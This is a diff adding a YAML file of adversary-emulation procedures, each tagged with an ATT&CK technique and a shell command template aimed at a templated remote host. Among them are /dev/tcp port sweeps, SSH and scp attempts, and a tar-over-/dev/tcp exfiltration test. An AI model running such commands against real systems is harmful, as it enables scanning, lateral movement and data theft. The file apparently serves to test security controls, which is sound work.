@@ -1,0 +1,69 @@
+# Depth procedures for the remote family.
+attack_version: "20.1"
+procedures:
+  - id: d-tcp-probe-fail
+    technique: T1046
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: timeout 3 bash -c "exec 3<>/dev/tcp/{{ip}}/{{port}}" 2>/dev/null && echo open$? || echo no$?
+  - id: d-port-sweep
+    technique: T1595.002
+    tactic: TA0043
+    source: own
+    protocol: ssh
+    template: for p in 22 80 443 3306; do timeout 2 bash -c "exec 3<>/dev/tcp/{{ip}}/$p" 2>/dev/null && echo p$p-open; done; echo sweep$?
+  - id: d-fetch-attempt
+    technique: T1105
+    tactic: TA0011
+    source: own
+    protocol: ssh
+    template: timeout 3 bash -c "exec 3<>/dev/tcp/{{ip}}/80" 2>/dev/null && echo got$? || echo no$?
+  - id: d-ssh-remote-fail
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: ssh -oBatchMode=yes -oConnectTimeout=3 {{user}}@{{ip}} id 2>/dev/null || echo no$?
+  - id: d-scp-remote-fail
+    technique: T1570
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: scp -oBatchMode=yes -oConnectTimeout=3 /etc/hostname {{user}}@{{ip}}:/tmp/ 2>/dev/null || echo no$?
+  - id: d-tar-exfil-fail
+    technique: T1048.002
+    tactic: TA0010
+    source: own
+    protocol: ssh
+    template: tar cz /etc/hostname 2>/dev/null | timeout 3 bash -c "cat > /dev/tcp/{{ip}}/{{port}}" 2>/dev/null || echo no$?
+  - id: d-dns-fail
+    technique: T1016
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: getent hosts {{domain}} >/dev/null 2>&1 && echo ok$? || echo no$?
+  - id: d-keyscan-fail
+    technique: T1021.004
+    tactic: TA0008
+    source: own
+    protocol: ssh
+    template: timeout 4 ssh-keyscan {{ip}} 2>/dev/null | grep -q ssh-ed25519 || echo no$?
+  - id: d-route-shape
+    technique: T1016
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: ip route | grep -q . && echo ok$?
+  - id: d-iface-shape
+    technique: T1016
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: ip -4 addr show | grep -q "inet " && echo ok$?
+  - id: d-resolv-shape
+    technique: T1016
+    tactic: TA0007
+    source: own
+    protocol: ssh
+    template: test -s /etc/resolv.conf && echo ok$?
